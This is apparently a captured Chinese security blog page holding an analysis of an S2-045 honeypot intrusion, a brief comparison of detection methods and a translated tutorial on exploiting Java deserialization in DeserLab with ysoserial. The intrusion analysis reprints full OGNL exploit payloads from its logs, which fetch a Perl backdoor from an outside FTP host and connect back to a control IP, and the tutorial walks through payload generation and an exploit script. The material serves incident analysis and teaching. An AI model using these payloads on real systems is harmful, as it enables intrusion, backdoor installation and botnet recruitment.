6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='perl bc.pl 201.33.21.109 333').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.082 252</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:02:20:40 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget ftp://88.105.16.7/Public/bc.pl').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 2.506 700</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:02:20:53 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='perl bc.pl 201.33.21.109 333').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.307 370</span></div></pre></td></tr></table></figure></p>
<p>从日志中提取一下攻击者的操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">201.33.21.109 - - [02/Sep/2017:01:35:05 +0000] (<span class="comment">#cmd='nMaskCustomMuttMoloz')</span></div><div class="line">201.33.21.109 - - [02/Sep/2017:01:35:05 +0000] (<span class="comment">#cmd='ver &amp; uname')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:38:01 +0000] (<span class="comment">#cmd='whoami')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:45 +0000] (<span class="comment">#cmd='wget ftp://88.105.16.7/Public/bc.pl')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:54 +0000] (<span class="comment">#cmd='perl bc.pl 201.33.21.109 333')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:43:20 +0000] (<span class="comment">#cmd='wget ftp://88.105.16.7/Public/bc.pl')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:02:20:53 +0000] (<span class="comment">#cmd='perl bc.pl 201.33.21.109 333')</span></div></pre></td></tr></table></figure></p>
<p>首先，攻击者使用 ip 201.33.21.109 探测了漏洞是否存在，然后使用 ip 201.79.64.0执行了攻击指令，从 ftp 服务器88.105.16.7上下载了 bc.pl 脚本，接着就执行了该脚本</p>
<p>bc.pl 是使用 perl 语言编写的一个后门脚本，github上有这个脚本，地址<a href="https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/PL/dc.pl(https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/PL/dc.pl" target="_blank" rel="external">https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/PL/dc.pl(https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/PL/dc.pl</a>)<br>通过这个脚本连接了控制端201.33.21.109，这个 ip 正是此前探测的 ip,在攻击者连接上蜜罐后进行的一些操作没有捕捉到，但是在 /tmp 目录下留下了一些文件，大致分析一下,攻击者下载了两个压缩包，分别是 s4.zip 和 xad.zip<br>其中 s4.zip 内容如下</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_16-39-53.png" alt="image2017-9-12_16-39-53"></p>
<p>h是一个ELF文件，ports配置了8080端口，paths放了很多路径：</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_16-40-47.png" alt="image2017-9-12_16-40-47"></p>
<p>s是一个shell脚本，用来从ftp服务器上下载ip列表，这个服务器上存放了大量的ip:</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_16-46-11.png" alt="image2017-9-12_16-46-11"></p>
<p>此外攻击者还下载了名为 <strong>scan.py </strong>的脚本，这个脚本是 LiJieJie 写的一个 Struts2-045 漏洞批量扫描工具，地址 <a href="https://github.com/lijiejie/struts2_045_scan(" target="_blank" rel="external">https://github.com/lijiejie/struts2_045_scan(</a> <a href="https://github.com/lijiejie/struts2_045_scan" target="_blank" rel="external">https://github.com/lijiejie/struts2_045_scan</a>)</p>
<p>最终攻击者在服务器上留下了这样几个文件</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_17-5-32.png" alt="image2017-9-12_17-5-32"></p>
<p>ips 是待扫描的ip，多达 1300 多万个</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_17-6-47.png" alt="image2017-9-12_17-6-47"></p>
<p>还留了一个 output.good，存放了存在漏洞的主机，测试了几个确实存在漏洞</p>
<p>攻击过程：<strong>通过045漏洞获得服务器权限</strong>-&gt;<strong>从ftp服务器下载ip列表</strong>-&gt;<strong>使用脚本批量扫描</strong>-&gt;<strong>对存在漏洞的ip进行攻击</strong></p>
<p>涉及的几个ip分别来自巴西和波兰，近期网上也有人提到不少来自巴西的ip的恶意行为，查了下威胁情报后大致推测这是一个攻击流程的一部分，后期还可能利用漏洞服务器进行一些扫描、挖矿等恶意行为。</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\204.png" alt="204"></p>
<p>以上是s4.zip的恶意行为分析，下面对xad.zip内容进行分析：</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_17-13-20.png" alt="image2017-9-12_17-13-20"></p>
<p>install.txt 和 modulos.sh 内容是一样的，下载了一些环境</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\15-33.png" alt="15-33"></p>
<p>cgi 存放了要扫描的路径 /phpMyAdmin/scripts/setup.php 这利用的应该是一个 PHP 代码注入的漏洞，<a href="https://nvd.nist.gov/vuln/detail/CVE-2009-1151" target="_blank" rel="external">CVE-2009-1151</a></p>
<p>zmeu 是针对 phpmyadmin 的一个蠕虫</p>
<p>ss 应该就是主要的攻击程序</p>
<p>beta.sh 内容：</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\26-48.png" alt="26-48"></p>
<p>bios.txt 还是待扫描的ip，有99万个，经过扫描产生了大约200个存在漏洞的主机，存放在 vulns.txt</p>
<p>攻击流程：</p>
<p><strong>获取服务器权限</strong>-&gt;<strong>下载ip列表</strong>-&gt;<strong>安装需要的环境</strong>-&gt;<strong>批量扫描phpMyAdmin漏洞</strong></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>很经典的一个用s2漏洞批量抓鸡进行利用的黑产链，在入侵成功后攻击者继续利用两个高危漏洞批量扫描，进一步扩大战果，目的应该是为了获取尽可能多的主机权限，进而组成一个 bot 网络，后期可能进行 DDos 攻击或者挖矿行为或者其它黑产活动等，这已经形成了一条完整的产业链。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/01/09/s2-045入侵事件分析/" data-id="cjca1zrwo000m881bzxd2va1m" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-几种常见检测思路的特点" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/05/几种常见检测思路的特点/" class="article-date">
  <time datetime="2018-01-05T10:54:54.000Z" itemprop="datePublished">2018-01-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/05/几种常见检测思路的特点/">几种常见检测思路的特点</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="特征检测"><a href="#特征检测" class="headerlink" title="特征检测"></a>特征检测</h4><p>应用广泛（防病毒、网络设备、……）技术原理简明易懂，实现不太难。需要有样本持续积累（各种漏洞库、恶意代码库）作为检测的依据。样本分析、积累成本和制造样本成本不对称时，攻击方可以制造大量样本 DoS 防守方的样本分析、检测资源，造成特征检测不可用。</p>
<h4 id="基于信誉"><a href="#基于信誉" class="headerlink" title="基于信誉"></a>基于信誉</h4><p>目前逐渐开始广泛应用（防病毒、网络设备、……），技术原理也比较简明易懂，实现也不太难。需要有检测的基础能力，并积累时间、IP、域名、URL、文件等其他纬度的数据（信誉库）。首先，信誉很高的对象一次恶意的行为可能无法通过信誉判断（例如，一个良好信誉的人一次性恶意透支所有信用卡限额），其次信誉库需要积累，而且存在覆盖度不够的情况，再次，攻击方同样可以<br> DoS 检测能力。</p>
<h4 id="基于行为"><a href="#基于行为" class="headerlink" title="基于行为"></a>基于行为</h4><p>对正常的行为模式进行建模，不符合模型的被判断为可疑，进一步判断后用于完善正常行为模型。应用范围有限，技术复杂度高，实现比较困难。找到普适的建模方法比较困难。工程上可能一开始就不具备建模的纯正常行为的环境，如何得到正常行为的模型也比较困难。模型判断为可疑，如何进一步判断实际上往往还需要前面几种检测方法参与，最终也很难实现自动化。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/01/05/几种常见检测思路的特点/" data-id="cjca1zrwr000r881b0a1g5unb" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Java反序列化漏洞利用的学习与实践" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/12/Java反序列化漏洞利用的学习与实践/" class="article-date">
  <time datetime="2017-09-12T11:26:33.000Z" itemprop="datePublished">2017-09-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/12/Java反序列化漏洞利用的学习与实践/">Java反序列化漏洞利用的学习与实践</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/" target="_blank" rel="external">翻译</a><br>当你在尝试学习东西的时候，一个很好的的定期提示是，阅读与实际练习中你阅读的主题不一样的主题。这就是我们为什么去实践读过的项目是有益的。我们将要深入到现在已经存在的众所周知的java反序列化bugs中。最好的实践是你可以去真正的了解手头的项目，并可以根据自己的需要尝试改进。这篇博客我们将要涉及以下内容：</p>
<ol>
<li>利用反序列化漏洞</li>
<li>手动构造我们的payload<br>要清楚的是，第一步将是使用当前的工具实践序列化漏洞的利用，并解释所采用的方法。第二步放大payload；payload究竟是什么？我们如何手工创建？最终的目的是充分了解它是如何工作的，以及掌握将来理解类似bug的方法。<br>我会提到整个博客中使用的所有工具，但是至少你需要了解如下内容：<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/NickstaDB/DeserLab</div></pre></td></tr></table></figure>
</li>
</ol>
<p>这就是我们将要利用的bug，选择一个模拟bug的原因是我们可以控制它的所有面，从而更好的理解一个反序列化漏洞的工作原理。</p>
<p>###利用Deserlab<br>首先，确保你阅读了介绍DeserLab和Java反序列化的<a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">blog</a><br>这篇blog对Java反序列化协议本身的深入分析。通过继续阅读本节，你将掌握DeserLab的用法。本节其余的部分，我们将使用编译的jar文件，请确认从github下载了这些文件。现在开始吧：<br>通常我处理大多数问题的方法是先了解如何以正确的方式运行，我们需要对DeserLab做如下操作：<br>    运行服务器和客户端<br>    捕获流量<br>    分析流量<br>使用如下命令运行客户端和服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">java -jar DeserLab.jar -server 127.0.0.1 6666</div><div class="line">java -jar DeserLab.jar -client 127.0.0.1 6666</div></pre></td></tr></table></figure></p>
<p>命令的input/output如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">java -jar DeserLab.jar -server 127.0.0.1 6666</div><div class="line"> [+] DeserServer started, listening on 127.0.0.1:6666</div><div class="line"> [+] Connection accepted from 127.0.0.1:50410</div><div class="line"> [+] Sending hello...</div><div class="line"> [+] Hello sent, waiting <span class="keyword">for</span> hello from client...</div><div class="line"> [+] Hello received from client...</div><div class="line"> [+] Sending protocol version...</div><div class="line"> [+] Version sent, waiting <span class="keyword">for</span> version from client...</div><div class="line"> [+] Client version is compatible, reading client name...</div><div class="line"> [+] Client name received: testing</div><div class="line"> [+] Hash request received, hashing: <span class="built_in">test</span></div><div class="line"> [+] Hash generated: 098f6bcd4621d373cade4e832627b4f6</div><div class="line"> [+] Done, terminating connection.</div><div class="line"></div><div class="line">java -jar DeserLab.jar -client 127.0.0.1 6666</div><div class="line"> [+] DeserClient started, connecting to 127.0.0.1:6666</div><div class="line"> [+] Connected, reading server hello packet...</div><div class="line"> [+] Hello received, sending hello to server...</div><div class="line"> [+] Hello sent, reading server protocol version...</div><div class="line"> [+] Sending supported protocol version to the server...</div><div class="line"> [+] Enter a client name to send to the server:</div><div class="line"> testing</div><div class="line"> [+] Enter a string to <span class="built_in">hash</span>:</div><div class="line"> <span class="built_in">test</span></div><div class="line"> [+] Generating <span class="built_in">hash</span> of <span class="string">"test"</span>...</div><div class="line"> [+] Hash generated: 098f6bcd4621d373cade4e832627b4f6</div></pre></td></tr></table></figure></p>
<p> 以上不是我们真正关心的问题，真正的问题是，怎么实现反序列化部分。要解答这个问题，你可以用wireshark, tcpdump ,tshark捕获6666端口的流量.要使用tcpdump捕获流量，可以执行如下命令：<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -i lo -n -w deserlab.pcap <span class="string">'port 6666'</span></div></pre></td></tr></table></figure></p>
<p>阅读下面的内容前，用wireshark打开pcap文件。根据Nick的<a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">blog</a>，你至少可以识别来回传递的序列化Java对象:<br><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/normaldeser.png" alt=""></p>
<p>#####序列化数据的提取：<br>现在我们指出了序列化数据正在传输的事实，让我们开始了解实际传输的内容。我决定使用这两款实用的工具 <a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="external">SerializationDumper</a>和<a href="https://github.com/frohoff/jdeserialize/tree/master/jdeserialize" target="_blank" rel="external">jdeserialize</a>，而不是根据blog中提供的信息编写自己的解析器。在我们使用工具之前，我们需要准备数据，所以把pcap包转换成我们可以分析的数据。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v <span class="string">',,'</span> | grep <span class="string">'^6666,'</span> | cut -d<span class="string">','</span> -f2 | tr <span class="string">'\n'</span> <span class="string">':'</span> | sed s/://g</div></pre></td></tr></table></figure></p>
<p>现在一行缩短了很多，现在它可以工作了。我们把他分解成可理解的块，它所做的就是把pcap数据转换成一行十六进制编码的输出字符串。它做的第一件事是将pcap转换成只包含传输数据和Tcp源端口，目的端口的文本形式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=,</div></pre></td></tr></table></figure></p>
<p>看起来像这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">50432,,6666</div><div class="line">6666,,50432</div><div class="line">50432,,6666</div><div class="line">50432,aced0005,6666</div><div class="line">6666,,50432</div><div class="line">6666,aced0005,50432</div></pre></td></tr></table></figure></p>
<p>在像上面的代码片段中可以看到，在TCP三次握手之间没有数据，因此有,,这部分。之后客户端发送服务端确认的第一个字节，然后服务端返回一些字节等等。命令的第二部分将它转换为字符串，只需根据行开始处的端口选择有效payloads。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">| grep -v <span class="string">',,'</span> | grep <span class="string">'^6666,'</span> | cut -d<span class="string">','</span> -f2 | tr <span class="string">'\n'</span> <span class="string">':'</span> | sed s/://g</div><div class="line">以上的命令仅会选择服务器的回复，如果希望客户端数据需要更改端口好。最终转换结果显示如下所示：</div><div class="line">```bash</div><div class="line">aced00057704f000baaa77020101737200146e622e64657365722e486[...]</div></pre></td></tr></table></figure></p>
<p>这是我们可以使用的，因为它是发送和接受的数据的干净的表示。让我们使用这两个工具分析一下数据，首先我们使用SerializationDumper，然后我们将使用jdeserialize。为什么是用两个工具？因为（如果可能的话）用不同的工具来分析潜在的错误或问题是很好的做法。如果你坚持使用一个工具，可能会出错，而没有察觉。尝试不同的 工具也非常有趣。</p>
<p>#####序列化数据分析<br>使用SerializationDumper是非常简单的，因为你可以传递序列化数据的十六进制形式作为第一个参数，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar SerializationDumper-v1.0.jar aced00057704f000baaa77020101</div></pre></td></tr></table></figure></p>
<p>输出的内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">STREAM_MAGIC - 0xac ed</div><div class="line">STREAM_VERSION - 0x00 05</div><div class="line">Contents</div><div class="line"> TC_BLOCKDATA - 0x77</div><div class="line"> Length - 4 - 0x04</div><div class="line"> Contents - 0xf000baaa</div><div class="line"> TC_BLOCKDATA - 0x77</div><div class="line"> Length - 2 - 0x02</div><div class="line"> Contents - 0x0101</div><div class="line"> TC_OBJECT - 0x73</div><div class="line"> TC_CLASSDESC - 0x72</div><div class="line"> className</div><div class="line"> Length - 20 - 0x00 14</div><div class="line"> Value - nb.deser.HashRequest - 0x6e622e64657365722e4861736852657175657374</div></pre></td></tr></table></figure></p>
<p>如果我们要使用jdeserialize分析相同的序列化数据，首先要构建jdeserialize，可以使用提供的build.xml文件里的<a href="http://ant.apache.org/" target="_blank" rel="external">ant</a>。我选择了手动编译，可以通过以下命令实现：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir build</div><div class="line">javac -d ./build/ src/*</div><div class="line"><span class="built_in">cd</span> build</div><div class="line">jar cvf jdeserialize.jar *</div></pre></td></tr></table></figure></p>
<p>经过以上操作我们可以产生一个可以使用的jar文件，你可以用下面的命令测试它，它会显示帮助信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp jdeserialize.jar org.unsynchronized.jdeserialize</div></pre></td></tr></table></figure></p>
<p>由于jdeserialize需要一个文件，我们可以用如下的Python代码转换序列化数据的十六进制表示形式（注意缩短十六进制字符串以进行博客布局）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open(<span class="string">'rawser.bin'</span>,<span class="string">'wb'</span>).write(<span class="string">'aced00057704f000baaa77020146636'</span>.decode(<span class="string">'hex'</span>))</div></pre></td></tr></table></figure></p>
<p>我们现在可以通过运行jdeserialize来分析这个文件，文件名作为应该产生的第一个参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">java -cp jdeserialize.jar org.unsynchronized.jdeserialize rawser.bin</div><div class="line"> <span class="built_in">read</span>: [blockdata 0x00: 4 bytes]</div><div class="line"> <span class="built_in">read</span>: [blockdata 0x00: 2 bytes]</div><div class="line"> <span class="built_in">read</span>: nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;</div><div class="line"> //// BEGIN stream content output</div><div class="line"> [blockdata 0x00: 4 bytes]</div><div class="line"> [blockdata 0x00: 2 bytes]</div><div class="line"> nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;</div><div class="line"> //// END stream content output</div><div class="line"></div><div class="line">//// BEGIN class declarations (excluding array classes)</div><div class="line"> class nb.deser.HashRequest implements java.io.Serializable &#123;</div><div class="line"> java.lang.String dataToHash;</div><div class="line"> java.lang.String theHash;</div><div class="line"> &#125;</div><div class="line"></div><div class="line">//// END class declarations</div><div class="line"></div><div class="line">//// BEGIN instance dump</div><div class="line"> [instance 0x7e0002: 0x7e0000/nb.deser.HashRequest</div><div class="line"> field data:</div><div class="line"> 0x7e0000/nb.deser.HashRequest:</div><div class="line"> dataToHash: r0x7e0003: [String 0x7e0003: <span class="string">"test"</span>]</div><div class="line"> theHash: r0x7e0004: [String 0x7e0004: <span class="string">"098f6bcd4621d373cade4e832627b4f6"</span>]</div><div class="line"> ]</div><div class="line"> //// END instance dump</div></pre></td></tr></table></figure></p>
<p>我们从序列化数据分析工具的输出中学到的第一件事是它的序列化数据:)。我们学到的第二件事就是，事实上在客户端和服务器之间显式地传送一个对象“nb.deser.HashRequest”。如果我们将此分析与我们之前的wireshark查看的数据结合在一起，我们可以知道用户名是以TC_BLOCKDATA类型的字符串形式发送的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> TC_BLOCKDATA - 0x77</div><div class="line"> Length - 9 - 0x09</div><div class="line"> Contents - 0x000774657374696e67</div><div class="line"></div><div class="line"><span class="string">'000774657374696e67'</span>.decode(<span class="string">'hex'</span>)</div><div class="line"><span class="string">'\x00\x07testing'</span></div></pre></td></tr></table></figure></p>
<p>这让我们非常了解DeserLab客户端和DeserLab服务器如何相互通信。现在我们来看看如何使用ysoserial来利用。</p>
<h5 id="Deserlab的利用"><a href="#Deserlab的利用" class="headerlink" title="Deserlab的利用"></a>Deserlab的利用</h5><p>由于我们通过对pcap和序列化数据的分析，我们对这个通信有一个清晰的了解，我们可以用嵌入ysoserial paylaod的一些硬编码数据构建我们自己的python脚本。为了保持简单，并且和wireshark流匹配，我决定几乎完全像wireshark流一样实现它，看起来就像：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mydeser = deser(myargs.targetip, myargs.targetport)</div><div class="line">mydeser.connect()</div><div class="line">mydeser.javaserial()</div><div class="line">mydeser.protohello()</div><div class="line">mydeser.protoversion()</div><div class="line">mydeser.clientname()</div><div class="line">mydeser.exploit(myargs.payloadfile)</div></pre></td></tr></table></figure></p>
<p>你可以在<a href="https://gist.github.com/DiabloHorn/8630948d953386d2ed575e17f8635ee7" target="_blank" rel="external">这里</a>找到完整的脚本。就像你可以看到的简单的模式方法是硬编码所有java反序列化数据。你可能想知道为什么mydeser.exploit(myargs.payloadfile)函数出现在mydeser.clientname()之后。也许更重要的是我如何决定的它的位置。我们来看看我的思考过程，以及如何实际生成和发送ysoserial payload。<br>在阅读的几篇关于java反序列化的文章（blog结尾处的引用）中，我了解到：大多数漏洞与java反序列化对象有关。<br>所以据我所知，当我们审查信息交换的时候就有java对象交换。这很容易在序列化分析的过程中发现，因为它包含‘ TC_OBJECT – 0x73’或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//// BEGIN stream content output</div><div class="line">[blockdata 0x00: 4 bytes]</div><div class="line">[blockdata 0x00: 2 bytes]</div><div class="line">[blockdata 0x00: 9 bytes]</div><div class="line">nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;</div><div class="line">//// END stream content output</div></pre></td></tr></table></figure></p>
<p>我们可以清楚的看到流的最后一部分是 ‘nb.deser.HashRequest’ 对象。读取这个对象的地方也是交换的最后一部分，因此解释了为什么代码最后一部分可以exploit。<br>DeserLab本身的代码并没有真正包含任何有用的东西，我们可以通过修改序列化漏洞利用它。<br>这个问题在下一节“手动创建payload”会很明显，现在我们就接受就好了。所以这意味着我们必须寻找可能包含可以帮助我们的代码的其他库。DeserLab中只有一个Groovy库，这就提示我们要用ysoserial payload；在实际使用中，可能需要自己反编译未知的库，自己开发有用的小工具。<br>由于知道了利用使用的库，payload的生成就非常简单：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 <span class="string">'ping 127.0.0.1'</span> &gt; payload.bin</div></pre></td></tr></table></figure></p>
<p>要知道payload如何工作，需要一些方法来检测它。现在ping 到 localhost就足够了，但是在现实世界中你需要更有创意。<br>现在一切准备就绪，你会认为它只是一个关闭有效载荷的问题？你是对的，但是我们不要忘了，java序列化头交换已经发生。<br>这意味着我们要把paylaod的前四个字节单独发出去：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">./deserlab_exploit.py 127.0.0.1 6666 payload_ping_localhost.bin</div><div class="line">2017-09-07 22:58:05,401 - INFO - Connecting</div><div class="line">2017-09-07 22:58:05,401 - INFO - java serialization handshake</div><div class="line">2017-09-07 22:58:05,403 - INFO - protocol specific handshake</div><div class="line">2017-09-07 22:58:05,492 - INFO - protocol specific version handshake</div><div class="line">2017-09-07 22:58:05,571 - INFO - sending name of connected client</div><div class="line">2017-09-07 22:58:05,571 - INFO - exploiting</div></pre></td></tr></table></figure></p>
